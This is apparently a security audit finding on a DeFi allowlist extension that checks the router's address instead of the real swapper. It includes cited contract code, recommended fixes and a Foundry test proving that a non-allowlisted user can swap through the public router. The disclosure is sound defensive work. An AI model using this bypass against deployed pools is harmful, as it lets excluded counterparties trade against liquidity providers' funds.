### Title
SwapAllowlistExtension Gates the Router Address Instead of the Actual Swapper, Allowing Any User to Bypass the Allowlist - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

### Summary

`SwapAllowlistExtension.beforeSwap()` checks the `sender` argument passed by the pool, which is `msg.sender` of the pool's `swap()` call. When a user swaps through `MetricOmmSimpleRouter`, the pool's `msg.sender` is the router contract, not the actual user. If the pool admin allowlists the router (the natural step to enable router-mediated swaps for their allowlisted users), every non-allowlisted user can bypass the gate by routing through the public router.

### Finding Description

`MetricOmmPool.swap()` passes `msg.sender` as the `sender` argument to `_beforeSwap()`: [1](#0-0) 

`_beforeSwap()` forwards that value unchanged to every configured extension: [2](#0-1) 

`SwapAllowlistExtension.beforeSwap()` then checks `allowedSwapper[msg.sender][sender]`, where `msg.sender` is the pool and `sender` is whatever the pool forwarded: [3](#0-2) 

`MetricOmmSimpleRouter.exactInputSingle()` calls `pool.swap()` directly, making the pool's `msg.sender` the router, not the end user: [4](#0-3) 

The same pattern applies to `exactInput`, `exactOutputSingle`, and `exactOutput`: [5](#0-4) 

The result is a two-sided failure:

- **Router not allowlisted**: allowlisted users cannot swap through the router even though they are individually permitted — broken core functionality.
- **Router allowlisted** (the natural admin action to re-enable router-mediated swaps): `allowedSwapper[pool][router]` is `true`, so the check passes for every caller regardless of their individual allowlist status — complete bypass of the per-user gate.

### Impact Explanation

A pool configured with `SwapAllowlistExtension` intends to restrict swaps to a curated set of addresses (e.g., KYC'd counterparties, whitelisted market makers). Once the pool admin adds the router to the allowlist to restore router usability, any address — including those explicitly excluded — can execute swaps against the pool by calling `router.exactInputSingle()`. The allowlist invariant is fully nullified: the pool accepts token input from and delivers token output to arbitrary, non-allowlisted users, directly violating the protocol's access-control guarantee and exposing LP funds to unrestricted counterparties.

### Likelihood Explanation

The trigger requires no special privilege. Any public user can call `MetricOmmSimpleRouter`. The only precondition is that the pool admin has allowlisted the router — a step they must take if they want their allowlisted users to be able to use the standard periphery. The router is a deployed, immutable, public contract, so the bypass is permanently available once the router is added. Likelihood is high whenever the pool uses `SwapAllowlistExtension` and the router is in the allowlist.

### Recommendation

The extension must recover the original end-user identity rather than trusting the `sender` argument, which reflects the immediate pool caller. Two sound approaches:

1. **Pass the real user through `extensionData`**: The router encodes `msg.sender` into `extensionData`; the extension decodes and verifies it, also checking that `msg.sender` (the pool's caller) is a recognized router. This requires a trusted router registry.
2. **Check `sender` only for direct pool calls; require a trusted forwarder for router calls**: The extension maintains a set of trusted routers and, when `sender` is a trusted router, reads the actual user from a standardized field in `extensionData`.

The simplest safe fix is to reject any `sender` that is not itself in the allowlist, and require users to call the pool directly — or redesign the allowlist to operate at the router level where `msg.sender` is the actual user.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup: pool with SwapAllowlistExtension configured.
// ALICE is allowlisted. BOB is not.

function test_RouterBypassesSwapAllowlist() external {
    // Step 1: Admin allowlists ALICE directly and the router
    //         (to let ALICE use the router).
    vm.prank(poolAdmin);
    swapAllowlist.setAllowedToSwap(address(pool), ALICE, true);
    vm.prank(poolAdmin);
    swapAllowlist.setAllowedToSwap(address(pool), address(router), true);

    // Step 2: BOB is NOT allowlisted. Direct pool swap reverts.
    vm.prank(BOB);
    vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
    pool.swap(BOB, true, 1000, 0, "", "");

    // Step 3: BOB routes through the public router — succeeds because
    //         the extension sees sender=router (allowlisted), not BOB.
    vm.prank(BOB);
    // BOB must have approved tokenIn to the router
    router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:            address(pool),
        tokenIn:         token0,
        tokenOut:        token1,
        zeroForOne:      true,
        amountIn:        1000,
        amountOutMinimum: 0,
        recipient:       BOB,
        deadline:        block.timestamp + 1,
        priceLimitX64:   0,
        extensionData:   ""
    }));

    // Step 4: BOB received token1 despite never being allowlisted.
    assertGt(IERC20(token1).balanceOf(BOB), 0);
}
```

Run with:
```
forge test --via-ir -vvvv --mt test_RouterBypassesSwapAllowlist
```

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L159-177)
```text
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L99-125)
```text
    for (uint256 i = 0; i <= last; i++) {
      address pool = params.pools[i];
      bool zeroForOne = MetricOmmSwapPath.resolveZeroForOneBitmap(params.zeroForOneBitMap, i);

      _setNextCallbackContext(pool, CALLBACK_MODE_JUST_PAY, i == 0 ? msg.sender : address(this), params.tokens[i]);
      (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(pool)
        .swap(
          i == last ? params.recipient : address(this),
          zeroForOne,
          amount,
          MetricOmmSwapPath.openLimit(zeroForOne),
          "",
          params.extensionDatas[i]
        );

      int128 amountInActual = MetricOmmSwapResults.extractAmountIn(zeroForOne, amount0Delta, amount1Delta);
      if (amountInActual < amount) revert InvalidInputAmountAtHop(uint8(i), amountInActual, amount);

      amount = MetricOmmSwapResults.extractAmountOut(zeroForOne, amount0Delta, amount1Delta);
    }

    if (amount <= 0) revert InvalidSwapDeltas();
    amountOut = MetricOmmSwapInputs.int128ToUint128(amount);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
